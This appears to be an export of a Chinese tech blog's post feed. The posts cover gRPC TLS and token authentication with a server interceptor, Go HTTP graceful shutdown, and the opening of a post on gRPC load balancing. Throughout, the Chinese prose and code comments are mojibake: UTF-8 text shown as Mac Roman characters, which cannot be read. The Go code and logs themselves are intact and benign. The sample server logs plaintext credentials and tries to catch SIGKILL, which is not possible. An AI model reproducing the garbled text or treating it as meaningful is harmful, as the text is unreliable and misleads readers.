ËøôÈáå‰∏ªË¶ÅÊåáCAÁöÑËØÅ‰π¶// serverNameOverride ‰ªÖ‰ªÖÁî±‰∫éÊµãËØï, ÈÄöÂ∏∏‰º†ÂÖ•""func NewClientTLSFromFile(certFile, serverNameOverride string) (TransportCredentials, error) &#123; b, err := ioutil.ReadFile(certFile) if err != nil &#123; return nil, err &#125; cp := x509.NewCertPool() if !cp.AppendCertsFromPEM(b) &#123; return nil, fmt.Errorf("credentials: failed to append certificates") &#125; return NewTLS(&amp;tls.Config&#123;ServerName: serverNameOverride, RootCAs: cp&#125;), nil&#125;// NewServerTLSFromFile ‰º†ÂÖ•ÊúçÂä°Á´ØÂª∫Á´ãTLSËøûÊé•Êó∂ÈúÄË¶ÅÁöÑËØÅ‰π¶, ËøôÈáå‰∏ªË¶ÅÊåáÊúçÂä°Á´ØÁöÑËØÅ‰π¶ÂíåÁßÅÈí•func NewServerTLSFromFile(certFile, keyFile string) (TransportCredentials, error) &#123; cert, err := tls.LoadX509KeyPair(certFile, keyFile) if err != nil &#123; return nil, err &#125; return NewTLS(&amp;tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;&#125;), nil&#125; Âõ†Ê≠§Êàë‰ª¨Ëá™Âª∫‰∏Ä‰∏™CA, ÁÑ∂ÂêéÁîüÊàêserverÁ´ØÁöÑËØÅ‰π¶Â∞±ÂèØ‰ª•‰ΩøÁî®ËøôÁªÑÂáΩÊï∞Êù•ÂÆåÊàêTLSÁöÑÂª∫Á´ã‰∫Ü ÊúçÂä°Á´ØTLSÂêØÂä®1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // ÂºïÂÖ•grpcËÆ§ËØÅÂåÖ "google.golang.org/grpc/grpclog")const ( // Address gRPCÊúçÂä°Âú∞ÂùÄ Address = "127.0.0.1:50052")// ÂÆö‰πâhelloServiceÂπ∂ÂÆûÁé∞Á∫¶ÂÆöÁöÑÊé•Âè£type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("failed to listen: %v", err) &#125; // TLSËÆ§ËØÅ creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; // ÂÆû‰æãÂåñgrpc Server, Âπ∂ÂºÄÂêØTLSËÆ§ËØÅ s := grpc.NewServer(grpc.Creds(creds)) // Ê≥®ÂÜåHelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS") s.Serve(listen)&#125; ÂÆ¢Êà∑Á´ØÂ∏¶ËØÅ‰π¶Ë∞ÉÁî®1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // ÂºïÂÖ•grpcËÆ§ËØÅÂåÖ "google.golang.org/grpc/grpclog")const ( // Address gRPCÊúçÂä°Âú∞ÂùÄ Address = "127.0.0.1:50052")func main() &#123; // TLSËøûÊé• creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; conn, err := grpc.Dial(Address, grpc.WithTransportCredentials(creds)) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // ÂàùÂßãÂåñÂÆ¢Êà∑Á´Ø c := pb.NewHelloClient(conn) // Ë∞ÉÁî®ÊñπÊ≥ï reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; ËÆ§ËØÅÊã¶Êà™Âô®ËÆ§ËØÅÂåÖÂê´2ÈÉ®ÂàÜ: ÊúçÂä°Á´ØËÆ§ËØÅtoken ÂÆ¢Êà∑Á´ØÊê∫Â∏¶token ÊúçÂä°Á´ØËÆ§ËØÅtokenÊã¶Êà™Âô®ÈÉ®ÂàÜÁöÑÊ∫êÁ†ÅÂú®interceptor.go‰∏≠, Êàë‰ªÖÂÖ≥Ê≥®ÊôÆÈÄörpc, ÂØπ‰∫éÊµÅÂºèrpcÁöÑÊã¶Êà™Âô®‰∏çÂÅöËØ¥Êòé, ‰ª•‰∏ãÊòØÁõ∏ÂÖ≥ÂáΩÊï∞: ÂÆ¢Êà∑Á´ØÊã¶Êà™Âô® ÊúçÂä°Á´ØÊã¶Êà™Âô®12345678// UnaryClientInterceptorÊã¶Êà™Âú®ÂÆ¢Êà∑Á´ØÊâßË°åÁöÑÈùûÊµÅÂºèRPC. inovkerÂ∞±ÊòØÁúüÊ≠£ÁöÑRPCÁöÑhandler,// Êã¶Êà™Âô®ÁöÑË¥£‰ªªÂ∞±ÊòØÂÆåÊàêËá™Â∑±ÁöÑÈÄªËæëÂêéË∞ÉÁî®ËØ•handler, ËÆ©ËØ∑Ê±ÇÁªßÁª≠RPCÁöÑÂ∑•‰Ωú type UnaryClientInterceptor func(ctx context.Context, method string, req, reply interface&#123;&#125;, cc *ClientConn, invoker UnaryInvoker, opts ...CallOption) error// UnaryServerInterceptor Êèê‰æõ‰∫Ü‰∏Ä‰∏™Âú®ÊúçÂä°Âô®‰∏äÊâßË°åunary RPCÁöÑÈí©Â≠ê, // info ÂåÖÂê´Êã¶Êà™Âô®ÂèØ‰ª•Êìç‰ΩúÁöÑRPCÁöÑÊâÄÊúâ‰ø°ÊÅØ„ÄÇ// handler ÊòØÊúçÂä°ÊñπÊ≥ïÂÆûÁé∞ÁöÑ‰∏Ä‰∏™ÂåÖË£ÖÂô®, ËÄåÊã¶Êà™Âô®ÁöÑË¥£‰ªªÂ∞±ÊòØË∞ÉÁî®ËØ•handlerÂÆåÊàêRPC, ËÆ©ËØ∑Ê±ÇÁªßÁª≠RPCÁöÑÂ∑•‰Ωútype UnaryServerInterceptor func(ctx context.Context, req interface&#123;&#125;, info *UnaryServerInfo, handler UnaryHandler) (resp interface&#123;&#125;, err error) Âõ†Ê≠§Êàë‰ª¨ÊÉ≥Ë¶ÅÂú®ÊúçÂä°Á´ØÂÆûÁé∞ËØ∑Ê±ÇÁöÑËÆ§ËØÅÂäüËÉΩ, ‰ªÖÈúÄË¶ÅÂÆûÁé∞‰∏Ä‰∏™Ëá™Â∑±ÁöÑUnaryServerInterceptorÂáΩÊï∞, Âπ∂‰∏îÂú®serverÂêØÂä®Êó∂‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôÂÆÉÂç≥ÂèØ ÊÄª‰ΩìÈúÄË¶Å3Ê≠•: Ëá™ÂÆö‰πâauthÂáΩÊï∞,ÂÆûÁé∞ËÆ§ËØÅÈÄªËæë ÂÆö‰πâ‰∏Ä‰∏™‰ΩøÁî®Ëá™ÂÆö‰πâËÆ§ËØÅ(auth)ÁöÑÊã¶Êà™Âô® serverÂêØÂä®Êó∂ÈöèÂèÇÊï∞‰º†ÂÖ• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package mainimport ( "net" pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/codes" // grpc ÂìçÂ∫îÁä∂ÊÄÅÁ†Å "google.golang.org/grpc/credentials" // grpcËÆ§ËØÅÂåÖ "google.golang.org/grpc/grpclog" "google.golang.org/grpc/metadata" // grpc metadataÂåÖ)const ( // Address gRPCÊúçÂä°Âú∞ÂùÄ Address = "127.0.0.1:50052")// ÂÆö‰πâhelloServiceÂπ∂ÂÆûÁé∞Á∫¶ÂÆöÁöÑÊé•Âè£type helloService struct&#123;&#125;// HelloService ...var HelloService = helloService&#123;&#125;func (h helloService) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) &#123; resp := new(pb.HelloResponse) resp.Message = "Hello " + in.Name + "." return resp, nil&#125;// auth È™åËØÅTokenfunc auth(ctx context.Context) error &#123; md, ok := metadata.FromContext(ctx) if !ok &#123; return grpc.Errorf(codes.Unauthenticated, "Êó†TokenËÆ§ËØÅ‰ø°ÊÅØ") &#125; var ( appid string appkey string ) if val, ok := md["appid"]; ok &#123; appid = val[0] &#125; if val, ok := md["appkey"]; ok &#123; appkey = val[0] &#125; grpclog.Printf("appid: %s, appkey: %s\n", appid, appkey) if appid != "101010" || appkey != "i am key" &#123; return grpc.Errorf(codes.Unauthenticated, "TokenËÆ§ËØÅ‰ø°ÊÅØÊó†Êïà: appid=%s, appkey=%s", appid, appkey) &#125; return nil&#125;func main() &#123; listen, err := net.Listen("tcp", Address) if err != nil &#123; grpclog.Fatalf("Failed to listen: %v", err) &#125; var opts []grpc.ServerOption // TLSËÆ§ËØÅ creds, err := credentials.NewServerTLSFromFile("../keys/server1.pem", "../keys/server1.key") if err != nil &#123; grpclog.Fatalf("Failed to generate credentials %v", err) &#125; opts = append(opts, grpc.Creds(creds)) // Ê≥®ÂÜåinterceptor var interceptor grpc.UnaryServerInterceptor interceptor = func(ctx context.Context, req interface&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (resp interface&#123;&#125;, err error) &#123; err = auth(ctx) if err != nil &#123; return &#125; // ÁªßÁª≠Â§ÑÁêÜËØ∑Ê±Ç return handler(ctx, req) &#125; opts = append(opts, grpc.UnaryInterceptor(interceptor)) // ÂÆû‰æãÂåñgrpc Server s := grpc.NewServer(opts...) // Ê≥®ÂÜåHelloService pb.RegisterHelloServer(s, HelloService) grpclog.Println("Listen on " + Address + " with TLS + Token + Interceptor") s.Serve(listen)&#125; ÂÆ¢Êà∑Á´ØÊê∫Â∏¶tokenËÄåËá≥‰∫éÂÆ¢Êà∑Á´ØÂ¶Ç‰ΩïÂú®ÊØèÊ¨°Ë∞ÉÁî®Êó∂ÈÉΩ‰º†ÈÄíËá™Â∑±ÁöÑtoken‰ø°ÊÅØ, ÊúâÊØîÂÆ¢Êà∑Á´ØÊã¶Êà™Âô®Êõ¥Êñπ‰æøÁöÑÊñπÂºè, Âõ†‰∏∫credentials‰∏≠ÊúâÊèê‰æõËøôÊ†∑ÁöÑÊé•Âè£ËøôÈÉ®ÂàÜ‰ª£Á†ÅÂú®credentials.go‰∏≠1234567891011// PerRPCCredentials ‰∏∫ËÆ§ËØÅÂÆö‰πâ‰∫Ü‰∏Ä‰∏™ÈÄöÁî®Êé•Âè£, ÊØèÊ¨°RPCË∞ÉÁî®ÈÉΩÈúÄË¶ÅÊèê‰æõÂÆâÂÖ®‰ø°ÊÅØ(ÊØîÂ¶Çoauth2ÁöÑtoken)type PerRPCCredentials interface &#123; // GetRequestMetadata Ëé∑ÂèñÂΩìÂâçËØ∑Ê±ÇÁöÑÂÖÉÊï∞ÊçÆ, Â¶ÇÊûúÈúÄË¶ÅÂèØ‰ª•Âà∑Êñ∞tokens. // ËØ•ÊñπÊ≥ïÂú®ËØ∑Ê±ÇË¢´‰º†Ëæì‰πãÂâçË∞ÉÁî®, ËÄåÊï∞ÊçÆÈúÄË¶ÅÊîæÂú®headerÈáåÈù¢ÊàñËÄÖÂÖ∂‰ªñcontext‰∏≠. // uri‰ª£Ë°®ËØ∑Ê±ÇÊù°ÁõÆÁöÑURI // Âú®Â∫ïÂ±ÇÂÆûÁé∞ÁöÑÊîØÊåÅ‰∏ã, ctxÂèØ‰ª•Áî®‰∫éË∂ÖÊó∂ÂíåÂèñÊ∂à // TODO: ÂÆö‰πâÈôêÂÆöÈîÆÁöÑÈõÜÂêàÔºåËÄå‰∏çÊòØÂ∞ÜÂÖ∂‰øùÁïô‰∏∫‰ªªÊÑèÂ≠óÁ¨¶‰∏≤„ÄÇ GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) // RequireTransportSecurity Ë°®ÊòéËÆ§ËØÅËøáÁ®ãÊòØÂê¶ÈúÄË¶ÅÂÆâÂÖ®‰º†Ëæì(ÊòØÂê¶ÂºÄÂêØTLS) RequireTransportSecurity() bool&#125; Âõ†Ê≠§ÂèØ‰ª•ÁúãÂá∫Êàë‰ª¨‰ªÖÈúÄË¶ÅÂÆûÁé∞GetRequestMetadataÂíåRequireTransportSecurityÂç≥ÂèØ, ÈÄöËøáGetRequestMetadataÊñπÊ≥ïÂ∞ÜÈúÄË¶ÅÁöÑtoken‰º†ÈÄíÁªôÂÆ¢Êà∑Á´ØÂç≥ÂèØ„ÄÇ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( pb "golang/grpc-auth/proto" "golang.org/x/net/context" "google.golang.org/grpc" "google.golang.org/grpc/credentials" // ÂºïÂÖ•grpcËÆ§ËØÅÂåÖ "google.golang.org/grpc/grpclog")const ( // Address gRPCÊúçÂä°Âú∞ÂùÄ Address = "127.0.0.1:50052" // OpenTLS ÊòØÂê¶ÂºÄÂêØTLSËÆ§ËØÅ OpenTLS = true)// customCredential Ëá™ÂÆö‰πâËÆ§ËØÅtype customCredential struct&#123;&#125;func (c customCredential) GetRequestMetadata(ctx context.Context, uri ...string) (map[string]string, error) &#123; return map[string]string&#123; "appid": "101010", "appkey": "i am key", &#125;, nil&#125;func (c customCredential) RequireTransportSecurity() bool &#123; if OpenTLS &#123; return true &#125; return false&#125;func main() &#123; var err error var opts []grpc.DialOption if OpenTLS &#123; // TLSËøûÊé• creds, err := credentials.NewClientTLSFromFile("../keys/cacert.pem", "server1") if err != nil &#123; grpclog.Fatalf("Failed to create TLS credentials %v", err) &#125; opts = append(opts, grpc.WithTransportCredentials(creds)) &#125; else &#123; opts = append(opts, grpc.WithInsecure()) &#125; // ÊåáÂÆöËá™ÂÆö‰πâËÆ§ËØÅ opts = append(opts, grpc.WithPerRPCCredentials(new(customCredential))) conn, err := grpc.Dial(Address, opts...) if err != nil &#123; grpclog.Fatalln(err) &#125; defer conn.Close() // ÂàùÂßãÂåñÂÆ¢Êà∑Á´Ø c := pb.NewHelloClient(conn) // Ë∞ÉÁî®ÊñπÊ≥ï reqBody := new(pb.HelloRequest) reqBody.Name = "gRPC" r, err := c.SayHello(context.Background(), reqBody) if err != nil &#123; grpclog.Fatalln(err) &#125; grpclog.Println(r.Message)&#125; ÊµãËØïÈíàÂØπ‰ª•‰∏äÂäüËÉΩÂÅöÊµãËØï Ê≠£Â∏∏ÊµãËØïÂ∏¶ËØÅ‰π¶ÂíåÂêàÊ≥ïtokenÁöÑËØ∑Ê±Ç123$go run main.go2017/08/08 10:36:10 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 10:36:13 appid: 101010, appkey: i am key ËØ∑Ê±ÇÊàêÂäü12$go run main.go2017/08/08 10:36:13 Hello gRPC. ÂºÇÂ∏∏ÊµãËØï‰∏çÂ∏¶ËØÅ‰π¶ÁöÑËØ∑Ê±Ç123$go run main.go2017/08/08 11:05:36 Listen on 127.0.0.1:50052 with TLS + Token + Interceptor2017/08/08 11:05:38 grpc: Server.Serve failed to complete security handshake from "127.0.0.1:56310": tls: first record does not look like a TLS handshake ËØ∑Ê±ÇÂ§±Ë¥•1234$go run main.go2017/08/08 11:05:38 transport: http2Client.notifyError got notified that the client transport was broken unexpected EOF.2017/08/08 11:05:38 rpc error: code = Internal desc = transport is closingexit status 1 Â∏¶ËØÅ‰π¶‰ΩÜtoken‰∏çÂêàÊ≥ï123$go run main.go2017/08/08 11:08:36 rpc error: code = Unauthenticated desc = TokenËÆ§ËØÅ‰ø°ÊÅØÊó†Êïà: appid=101010, appkey=i am key1exit status 1]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gRPC</tag>
        <tag>APIGateway</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Golang HTTPÊúçÂä°‰ºòÈõÖÈáçÂêØ]]></title>
    <url>%2F2017%2F08%2F06%2Fhttp-graceful%2F</url>
    <content type="text"><![CDATA[RESTful API GatewayÊòØ‰∏Ä‰∏™È´òÁ®≥ÂÆöÊÄßÁöÑÁªÑ‰ª∂, Âõ†Ê≠§ÈúÄË¶ÅÊúâÂÉèNginx ReloadÈÇ£Ê†∑Âπ≥ÊªëÂçáÁ∫ßÁöÑËÉΩÂäõ, Âç≥ÂÖ≥Èó≠Ê≠£Âú®ËøêË°åÁöÑËÄÅÁ®ãÂ∫èÔºåÂπ∂ÂêØÂä®Êñ∞Á®ãÂ∫è„ÄÇ Ê†áÂáÜÂ∫ìÁöÑÁöÑÂÆûÁé∞GoÂú®1.8ÂØπnet/httpËøõË°å‰∫ÜÊõ¥Êñ∞, Êèê‰æõ‰∫ÜhttpÊúçÂä°‰ºòÈõÖÂÖ≥Èó≠ÁöÑËÉΩÂäõ„ÄÇ ÂÆòÊñπËØ¥ÊòéÊàë‰ª¨Áúã‰∏ãserver.go‰∏≠ÂÖ≥‰∫éColseÊñπÊ≥ïÁöÑÊèèËø∞:1234567891011121314// CloseÂ∞Ü‰ºöÁ´ãÂç≥ÂÖ≥Èó≠ÊâÄÊúâÊ¥ªË∑ÉÁöÑÁõëÂê¨Âô®‰ª•ÂèäÊâÄÊúâËøûÊé•,ÊØîÂ¶ÇÊñ∞ËøûÊé•,Ê¥ªË∑ÉËøûÊé•, Á©∫Èó≤ËøûÊé•// Â¶ÇÊûúÊÉ≥‰ºòÈõÖÂÖ≥Èó≠ÊúçÂä°, ËØ∑‰ΩøÁî®Shutdown// Ê≥®ÊÑècloseÂπ∂‰∏çÂ∞ùËØïÂÖ≥Èó≠ÊàñËÄÖÁ≠âÂæÖhijackedËøûÊé•ÔºåÂ¶ÇWebSocketsfunc (srv *Server) Close() error &#123; srv.mu.Lock() defer srv.mu.Unlock() srv.closeDoneChanLocked() err := srv.closeListenersLocked() for c := range srv.activeConn &#123; c.rwc.Close() delete(srv.activeConn, c) &#125; return err&#125; ÂØπÊØîcloseÊñπÊ≥ï, Êàë‰ª¨Áúã‰∏ãShutdownÂà∞Â∫ïÂ§öÂÅö‰∫Ü‰ªÄ‰πàÂ∑•‰Ωú:12345678910111213141516171819202122232425262728293031323334353637// Shutdown‰ºöÂêØÂä®‰∏Ä‰∏™ÂÆöÊó∂Âô®,ÂÆöÊúüÂ∑°Ê£ÄÈÇ£‰∫õÁ©∫Èó≤ËøûÊé•, ÁÑ∂ÂêéÊääËøô‰∫õÁ©∫Èó≤ËøûÊé•ÂÖ≥Èó≠// ËÄåËøô‰∏™Â∑°Ê£ÄÊó∂Èó¥Â∞±ÊòØshutdownPollInterval, ÂèØ‰ª•ÁúãÂá∫ÈªòËÆ§‰∏∫500ÊØ´Áßí// // Êàë‰ª¨ËÉΩÊâæÂà∞‰∏çÊ∂âÂèäÊäïÁ•®ÁöÑÊúÄÁêÜÊÉ≥Ëß£ÂÜ≥ÊñπÊ°àÔºåÂêåÊó∂ÂÆÉÁöÑÊ∂àËÄó‰πüÂæàÂ∞ë(‰∏çÊ∂âÂèä‰ªª‰Ωï‰∫íÊñ•ÈîÅ),// ‰ΩÜÊòØÊòØÁïôÁªôËØªËÄÖ‰Ωú‰∏∫ÁªÉ‰π†„ÄÇvar shutdownPollInterval = 500 * time.Millisecond// Shutdown Â∞ÜÊó†‰∏≠Êñ≠ÁöÑÂÖ≥Èó≠Ê≠£Âú®Ê¥ªË∑ÉÁöÑËøûÊé•ÔºåÁÑ∂ÂêéÂπ≥ÊªëÁöÑÂÅúÊ≠¢ÊúçÂä°„ÄÇÂ§ÑÁêÜÊµÅÁ®ãÂ¶Ç‰∏ã:// 1) È¶ñÂÖàÂÖ≥Èó≠ÊâÄÊúâÁöÑÁõëÂê¨// 2) ÁÑ∂ÂêéÂÖ≥Èó≠ÊâÄÊúâÁöÑÁ©∫Èó≤ËøûÊé•// 3) ÁÑ∂ÂêéÊó†ÈôêÊúüÁ≠âÂæÖËøûÊé•Â§ÑÁêÜÂÆåÊØïËΩ¨‰∏∫Á©∫Èó≤ÔºåÂπ∂ÂÖ≥Èó≠// 4) Â¶ÇÊûúÊèê‰æõ‰∫Ü Â∏¶ÊúâË∂ÖÊó∂ÁöÑContextÔºåÂ∞ÜÂú®ÊúçÂä°ÂÖ≥Èó≠ÂâçËøîÂõû ContextÁöÑË∂ÖÊó∂ÈîôËØØ// // Shutdown Âπ∂‰∏çÂ∞ùËØïÂÖ≥Èó≠ÊàñËÄÖÁ≠âÂæÖ hijackedËøûÊé•Ôºå// Â¶Ç WebSockets„ÄÇÂ¶ÇÊûúÈúÄË¶ÅÁöÑËØùË∞ÉÁî®ËÄÖÈúÄË¶ÅÂàÜÂà´Â§ÑÁêÜËØ∏Â¶ÇÈïøËøûÊé•Á±ªÂûãÁöÑÁ≠âÂæÖÂíåÂÖ≥Èó≠„ÄÇfunc (srv *Server) Shutdown(ctx context.Context) error &#123; atomic.AddInt32(&amp;srv.inShutdown, 1) defer atomic.AddInt32(&amp;srv.inShutdown, -1) srv.mu.Lock() lnerr := srv.closeListenersLocked() srv.closeDoneChanLocked() srv.mu.Unlock() ticker := time.NewTicker(shutdownPollInterval) defer ticker.Stop() for &#123; if srv.closeIdleConns() &#123; return lnerr &#125; select &#123; case &lt;-ctx.Done(): return ctx.Err() case &lt;-ticker.C: &#125; &#125;&#125; ÁÆÄÂçïÊ†∑‰æãÊ†πÊçÆ‰∏äÈù¢ÁöÑÂàÜÊûê, Êàë‰ª¨ÂÜô‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊ†óÂ≠êËøõË°åÊµãËØï(GithubÂú∞ÂùÄ: HTTP Graceful)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "context" "fmt" "log" "net/http" "os" "os/signal" "syscall" "time")func main() &#123; http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) &#123; // for test active connection time.Sleep(time.Second * 2) fmt.Fprintf(w, "Hello World, %v\n", time.Now()) &#125;) s := &amp;http.Server&#123; Addr: ":8080", Handler: http.DefaultServeMux, ReadTimeout: 10 * time.Second, WriteTimeout: 10 * time.Second, MaxHeaderBytes: 1 &lt;&lt; 20, &#125; go func() &#123; log.Printf("server start at: 127.0.0.1:8080") log.Println(s.ListenAndServe()) log.Println("server shutdown") &#125;() // Handle SIGINT, SIGTERM, SIGKILL, SIGHUP, SIGQUIT ch := make(chan os.Signal) signal.Notify(ch, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGHUP, syscall.SIGQUIT) log.Println(&lt;-ch) // Stop the service gracefully. ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() log.Println(s.Shutdown(ctx)) // Wait gorotine print shutdown message time.Sleep(time.Second * 10) log.Println("done.")&#125; ÊµãËØïÂêØÂä®ÊúçÂä°Á´Ø, Âπ∂ÂÖ≥Ê≥®Êó•Âøó:1234567$go run main.go2017/08/06 16:06:47 server start at: 127.0.0.1:8080^C2017/08/06 16:07:10 interrupt2017/08/06 16:07:10 http: Server closed2017/08/06 16:07:10 server shutdown2017/08/06 16:07:11 &lt;nil&gt;2017/08/06 16:07:21 done. ‰ΩøÁî®curlÂèëËµ∑‰∏ÄÊ¨°ËØ∑Ê±Ç, Âú®ËØ∑Ê±Ç‰∏∫ÁªìÊùüÂâçÂÖ≥Èó≠ÊúçÂä°1234$curl localhost:8080Hello World, 2017-08-06 16:07:11.341038687 +0800 CST$curl localhost:8080curl: (7) Failed to connect to localhost port 8080: Connection refused ‰ªéÊµãËØïÁªìÊûúÂèØ‰ª•ÁúãÂá∫: Ê≠£Âú®ËøõË°åËÆøÈóÆÁöÑËØ∑Ê±Ç‰∏ç‰ºöË¢´ÂÖ≥Èó≠, ÁªßÁª≠Ê≠£Â∏∏ÂìçÂ∫î Êñ∞Â¢ûÁöÑËØ∑Ê±ÇÂàôÊãíÁªùËÆøÈóÆ Âõ†Ê≠§HTTPÁöÑShutdownÁöÑÁ°ÆÂèØ‰ª•Ëµ∑Âà∞‰ºòÈõÖÂÖ≥Èó≠ÊúçÂä°ÁöÑ‰ΩúÁî®„ÄÇ Á¨¨‰∏âÊñπÂÆûÁé∞ÂÆòÊñπ‰ªÖ‰ªÖÂÆûÁé∞‰∫Ü‰ºòÈõÖÁöÑÂÖ≥Èó≠, Âπ∂Ê≤°ÊúâÂÆûÁé∞‰ºòÈõÖÈáçÂêØ, ÊÉ≥Ë¶ÅÂÆûÁé∞ÂÉèNginxÈÇ£Ê†∑‰ºòÈõÖÈáçÂêØ, ËøòÊúâÂæàÂ§öÂ∑•‰ΩúË¶ÅÂÅö, Êúâ‰∏™‰∏çÈîôÁöÑÁ¨¨‰∏âÊñπÂ∫ìÂ∑≤ÁªèÂÆûÁé∞‰∫ÜËØ•ËÉΩÂäõ, ‰ª£ÁêÜË¥®Èáè‰πü‰∏çÈîô, ÂÄºÂæó‰ΩøÁî®ÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉGolangÂºÄÂèëÊîØÊåÅÂπ≥ÊªëÂçáÁ∫ßÔºà‰ºòÈõÖÈáçÂêØÔºâÁöÑHTTPÊúçÂä°]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gRPCÊúçÂä°ÂèëÁé∞ÂíåË¥üËΩΩÂùáË°°]]></title>
    <url>%2F2017%2F08%2F02%2Fapi-gateway-service-discovery-and-lb%2F</url>
    <content type="text"><![CDATA[APIÁΩëÂÖ≥ÈúÄË¶ÅÂÆûÁé∞ÊúçÂä°ÁöÑËá™Âä®ÂèëÁé∞ÂíåË¥üËΩΩÂùáË°°, Áî±‰∫éÂêéÈù¢ÁöÑÊúçÂä°Âü∫Êú¨ÈÉΩÈááÁî®gRPCÂÆûÁé∞, Âõ†Ê≠§ÈúÄË¶ÅÈ™åËØÅgRPCÂ¶Ç‰ΩïÂÆûÁé∞Ëøô2‰∏™ÂäüËÉΩ„ÄÇ Ê¶ÇËø∞ÊûÑÂª∫È´òÂèØÁî®„ÄÅÈ´òÊÄßËÉΩÁöÑÈÄö‰ø°ÊúçÂä°ÔºåÈÄöÂ∏∏ÈááÁî®ÊúçÂä°Ê≥®ÂÜå‰∏éÂèëÁé∞„ÄÅË¥üËΩΩÂùáË°°ÂíåÂÆπÈîôÂ§ÑÁêÜÁ≠âÊú∫Âà∂ÂÆûÁé∞„ÄÇgRPCÂú®ËÆæËÆ°Êó∂Â∑≤ÊúâËÄÉËôë, ÂÆòÊñπ‰πüÊèê‰æõ‰∫Ü‰∏Ä‰∫õÂü∫Êú¨ÂÆûÁé∞, ‰ΩÜÊòØÂ¶Ç‰ΩïÂõ¥ÁªïÂÆòÊñπËÆæËÆ°ÂÆûÁé∞ÊúçÂä°ÂèëÁé∞ÂíåË¥üËΩΩÂùáË°°Âç¥Âπ∂‰∏çÂÆπÊòì, Êàë‰ºöÂõ¥Áªï‰ª•‰∏ãÂá†ÁÇπËøõË°åÂ±ïÂºÄ: Ëß£ËØªÂÆòÊñπÊñáÊ°£: Load Balancing in gRPC Ë¥üËΩΩÂùáË°°ÈÉ®ÂàÜÊ∫êÁ†ÅËß£ËØª ‰ª£Á†ÅÂÆûÁé∞,ÂèÇËÄÉwonaming ÂÆòÊñπËÆæËÆ°ÂÆòÊñπËøôÁØáÊñáÊ°£‰∏ªË¶ÅÊòØÈòêËø∞Â¶Ç‰ΩïÂà©Áî®gRPCËÆæËÆ°Ë¥üËΩΩÂùáË°°„ÄÇ ËÉåÊôØÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØgGRCÁöÑË¥üËΩΩÂùáË°°ÊòØ‰ª•call‰∏∫Âü∫Á°Ä, ËÄå‰∏çÊòØ‰ª•ËøûÊé•‰∏∫Âü∫Á°Ä, ‰πüÂ∞±ÊòØËØ¥Âêå‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÁöÑ‰∏çÂêåËØ∑Ê±Ç ‰ºöË¢´ÂàÜÊëäÂà∞ÂêéÈù¢ËØ•ÊúçÂä°ÁöÑÈõÜÁæ§‰∏äÈù¢„ÄÇ Ë¥üËΩΩÂùáË°°ÁöÑÊñπÊ≥ïÂú®ËÆ®ËÆ∫‰ªª‰ΩïgRPCÁöÑÁªÜËäÇ‰πãÂâç, ÂÖàËÆ§ËØÜ‰∏ãÂ∏∏Áî®Ë¥üËΩΩÂùáË°°ÁöÑÊñπÊ≥ï: ‰ª£ÁêÜÊ®°Âºè(Proxy Model)‰ª£ÁêÜÊ®°ÂºèÁöÑË¥üËΩΩÂùáË°°Êú∫Âà∂‰Ωç‰∫éÊúçÂä°Â§ñÈÉ®, ÂÄüÂä©ÂÖ∂‰ªñÂ∑•ÂÖ∑ÂÆûÁé∞„ÄÇÂÆÉ‰∏ÄËà¨‰Ωç‰∫éÊ∂àË¥πËÄÖÂíåÊúçÂä°Êèê‰æõËÄÖ‰πãÈó¥, ÊØîÂ¶Ç‰∏ìÈó®ÁöÑÁ°¨‰ª∂ËÆæÂ§áF5, ÊàñËÄÖËΩØ‰ª∂HAProxy,NginxÁ≠â, 